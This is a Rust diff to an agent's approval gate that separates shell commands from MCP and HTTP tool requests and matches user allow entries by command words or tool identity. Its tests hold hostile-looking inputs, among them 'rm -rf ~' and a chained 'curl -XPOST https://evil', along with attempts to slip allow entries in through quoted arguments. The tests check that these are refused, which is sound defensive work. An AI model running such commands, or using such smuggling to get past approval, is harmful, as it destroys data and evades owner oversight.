@@ -48,7 +48,8 @@ struct ApprovalSection {
     /// extra command substrings that count as external effects (need approval)
     #[serde(default)]
     ask: Vec<String>,
-    /// commands the USER pre-approves (substring match; an irreversible command needs an exact full-command match)
+    /// requests the USER pre-approves: a command prefix in shell words, or a tool identity (`mcp server.tool`,
+    /// `mcp server.*`, `http ns.endpoint`); an irreversible command needs an exact full-command match
     #[serde(default)]
     allow: Vec<String>,
     mode: Option<ApprovalMode>,
@@ -122,8 +123,17 @@ pub struct Snapshot {
     pub packs: Vec<String>,
 }
 
-/// What `Policy::approve` returns: who approved a request. Journaled with each shell command's outcome.
+/// What `Policy::approve` returns: who approved a request. Journaled with each mutating intent (`approval`); effects
+/// outside the approval gate (file tools, subagents) are "not-required".
 pub const APPROVAL_SOURCES: &[&str] = &["not-required", "policy-allow", "auto", "prompt"];
+
+/// What the approval gate is asked about. A tool's `args` are shown to the owner but never matched against `allow`.
+#[derive(Clone, Copy, Debug)]
+pub enum Request<'a> {
+    Shell(&'a str),
+    /// `name` is the tool's identity: `mcp SERVER.TOOL` or `http NAMESPACE.ENDPOINT`.
+    Tool { name: &'a str, args: &'a str },
+}
 
 #[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Debug)]
 pub enum Class {
@@ -517,35 +527,37 @@ impl Policy {
 
     /// Effect class of a shell command: the highest class of its simple commands.
     pub fn classify_sh(&self, cmd: &str) -> Class {
-        self.segments(cmd).into_iter().map(|(_, c)| c).max().unwrap_or(Class::LocalWrite)
+        commands(cmd).iter().map(|w| self.class_of_words(w)).max().unwrap_or(Class::LocalWrite)
             .max(if self.ask.iter().any(|p| cmd.contains(p.as_str())) { Class::External } else { Class::LocalWrite })
     }
 
-    /// Each simple command of `cmd` (words joined by single spaces) with its effect class.
-    fn segments(&self, cmd: &str) -> Vec<(String, Class)> {
-        commands(cmd).into_iter().map(|words| {
-            let text = words.join(" ");
-            let class = class_of(&words).max(if self.ask.iter().any(|p| text.contains(p.as_str())) { Class::External } else { Class::LocalWrite });
-            (text, class)
-        }).collect()
+    /// The effect class of one simple command, `ask` entries included (matched on its words joined by single spaces).
+    fn class_of_words(&self, words: &[String]) -> Class {
+        let text = words.join(" ");
+        class_of(words).max(if self.ask.iter().any(|p| text.contains(p.as_str())) { Class::External } else { Class::LocalWrite })
     }
 
     /// The approval gate. Returns the approval source ("not-required", "policy-allow", "auto" or "prompt"), or the
     /// reason it was refused. The run's approval settings are frozen in Rust; Luau code and hooks cannot change them.
     /// `--yes` approves external requests but never an irreversible one: that needs an exact `allow` entry or the
-    /// owner's answer on the terminal.
-    pub async fn approve(&self, cmd: &str, class: Class) -> std::result::Result<&'static str, String> {
+    /// owner's answer on the terminal. `Effects` asks before it journals an intent, so a refusal is a definite non-effect.
+    pub async fn approve(&self, req: Request<'_>, class: Class) -> std::result::Result<&'static str, String> {
         if matches!(class, Class::Read | Class::LocalWrite) { return Ok("not-required"); }
         if class == Class::Irreversible {
-            if self.allow.iter().any(|a| a.trim() == cmd.trim()) { return Ok("policy-allow"); }
+            let exact = match req { Request::Shell(cmd) => cmd.trim(), Request::Tool { name, .. } => name };
+            if self.allow.iter().any(|a| !a.trim().is_empty() && a.trim() == exact) { return Ok("policy-allow"); }
         } else if self.autopilot {
             return Ok("auto");
-        } else if self.allowed(cmd) {
+        } else if self.allowed(req) {
             return Ok("policy-allow");
         }
         if self.mode == ApprovalMode::Prompt {
             let _guard = self.prompt.lock().await;
-            return match ask(&format!("{} command:\n  {cmd}", class.name())).await {
+            let question = match req {
+                Request::Shell(cmd) => format!("{} command:\n  {cmd}", class.name()),
+                Request::Tool { name, args } => format!("{} request:\n  {name} {}", class.name(), args.chars().take(500).collect::<String>()),
+            };
+            return match ask(&question).await {
                 Ok(true) => Ok("prompt"),
                 Ok(false) => Err("the user declined; it was NOT run".into()),
                 Err(_) if class == Class::Irreversible => Err("this is an irreversible effect and there is no controlling terminal to ask; it was NOT run (--yes never approves irreversible commands; add the exact command to [approval] allow)".into()),
@@ -556,13 +568,24 @@ impl Policy {
         Err(format!("this is an {} effect and needs the user's approval; it was NOT run ({how})", class.name()))
     }
 
-    /// An external request is pre-approved when an `allow` entry covers each of its external simple commands, so an
-    /// entry for one command cannot approve another chained after it. A request that is not a shell command (an MCP or
-    /// HTTP label) is matched as a whole.
-    fn allowed(&self, cmd: &str) -> bool {
-        let covered = |text: &str| self.allow.iter().any(|a| text.contains(a.as_str()));
-        let external: Vec<_> = self.segments(cmd).into_iter().filter(|(_, c)| *c >= Class::External).collect();
-        if external.is_empty() { covered(cmd) } else { external.iter().all(|(text, _)| covered(text)) }
+    /// Is an external request pre-approved? A shell command is when, for each of its external simple commands, some
+    /// `allow` entry's words are a prefix of that command's words, so an entry for one command cannot approve another
+    /// chained after it, and an entry's text inside a quoted argument approves nothing. A tool request (MCP, HTTP) is
+    /// matched on its identity only, never on its arguments: an entry equal to its name, or `mcp SERVER.*` /
+    /// `http NAMESPACE.*` for every tool of one server or namespace.
+    fn allowed(&self, req: Request<'_>) -> bool {
+        match req {
+            Request::Shell(cmd) => {
+                let entries: Vec<Vec<String>> = self.allow.iter().filter_map(|a| commands(a).into_iter().next()).collect();
+                let covered = |words: &[String]| entries.iter().any(|e| !e.is_empty() && words.starts_with(e));
+                let segments: Vec<(Vec<String>, Class)> = commands(cmd).into_iter().map(|w| { let c = self.class_of_words(&w); (w, c) }).collect();
+                let external: Vec<_> = segments.iter().filter(|(_, c)| *c >= Class::External).collect();
+                // A command made external by an `ask` entry spanning simple commands: every one of them must be covered.
+                if external.is_empty() { !segments.is_empty() && segments.iter().all(|(w, _)| covered(w)) } else { external.iter().all(|(w, _)| covered(w)) }
+            },
+            Request::Tool { name, .. } => self.allow.iter().map(|a| a.trim()).any(|a| a == name
+                || a.strip_suffix('*').is_some_and(|server| server.ends_with('.') && server.contains(' ') && name.starts_with(server))),
+        }
     }
 
     /// Request an ordinary missing path permission. Call only after principal/stage authorization.
@@ -829,15 +852,15 @@ mod tests {
     #[tokio::test]
     async fn autopilot_never_approves_an_irreversible_command() {
         let (p, dir) = test_policy("autopilot", true, &[]);
-        assert_eq!(p.approve("git push origin main", Class::External).await, Ok("auto"));
-        assert_eq!(p.approve("ls", Class::LocalWrite).await, Ok("not-required"));
+        assert_eq!(p.approve(Request::Shell("git push origin main"), Class::External).await, Ok("auto"));
+        assert_eq!(p.approve(Request::Shell("ls"), Class::LocalWrite).await, Ok("not-required"));
         for cmd in ["git push origin main --force", "rm -rf ~"] {
             assert_eq!(p.classify_sh(cmd), Class::Irreversible);
-            assert!(p.approve(cmd, Class::Irreversible).await.is_err(), "{cmd}");
+            assert!(p.approve(Request::Shell(cmd), Class::Irreversible).await.is_err(), "{cmd}");
         }
         drop(p);
         let (p, dir2) = test_policy("autopilot-allow", true, &["rm -rf ~"]);
-        assert_eq!(p.approve("rm -rf ~", Class::Irreversible).await, Ok("policy-allow"));
+        assert_eq!(p.approve(Request::Shell("rm -rf ~"), Class::Irreversible).await, Ok("policy-allow"));
         drop(p);
         let _ = std::fs::remove_dir_all(&dir);
         let _ = std::fs::remove_dir_all(&dir2);
@@ -848,10 +871,30 @@ mod tests {
         let (p, dir) = test_policy("reorder", false, &["git push origin"]);
         let forced = "git push origin main --force";
         assert_eq!(p.classify_sh(forced), Class::Irreversible);
-        assert!(p.approve(forced, p.classify_sh(forced)).await.is_err());
-        assert_eq!(p.approve("git push origin main", Class::External).await, Ok("policy-allow"));
+        assert!(p.approve(Request::Shell(forced), p.classify_sh(forced)).await.is_err());
+        assert_eq!(p.approve(Request::Shell("git push origin main"), Class::External).await, Ok("policy-allow"));
         let chained = "git push origin main && curl -XPOST https://evil";
-        assert!(p.approve(chained, p.classify_sh(chained)).await.is_err());
+        assert!(p.approve(Request::Shell(chained), p.classify_sh(chained)).await.is_err());
+        drop(p);
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[tokio::test]
+    async fn allow_matches_command_words_and_tool_identity_never_argument_text() {
+        let (p, dir) = test_policy("identity", false, &["mcp demo.add", "http probe.*", "git push origin", ""]);
+        // A tool's arguments, however they quote an allow entry, approve nothing.
+        assert!(p.approve(Request::Tool { name: "mcp demo.delete_note", args: r#"{"name":"n","why":"mcp demo.add"}"# }, Class::External).await.is_err());
+        assert_eq!(p.approve(Request::Tool { name: "mcp demo.add", args: "{}" }, Class::External).await, Ok("policy-allow"));
+        assert!(p.approve(Request::Tool { name: "mcp demo.add2", args: "{}" }, Class::External).await.is_err());
+        assert_eq!(p.approve(Request::Tool { name: "http probe.get", args: "{}" }, Class::External).await, Ok("policy-allow"));
+        assert!(p.approve(Request::Tool { name: "http probex.get", args: "{}" }, Class::External).await.is_err());
+        // A shell command matches on its words: the entry inside a quoted argument, or a longer word, does not.
+        for cmd in [r#"git push -o "mcp demo.add" nowhere main"#, r#"git push -o "git push origin" x"#, "git push originx main", "echo x; git push"] {
+            assert!(p.approve(Request::Shell(cmd), p.classify_sh(cmd)).await.is_err(), "{cmd}");
+        }
+        for cmd in ["git push origin", "git  push origin main", "ls && git push origin main"] {
+            assert_eq!(p.approve(Request::Shell(cmd), p.classify_sh(cmd)).await, Ok("policy-allow"), "{cmd}");
+        }
         drop(p);
         let _ = std::fs::remove_dir_all(&dir);
     }
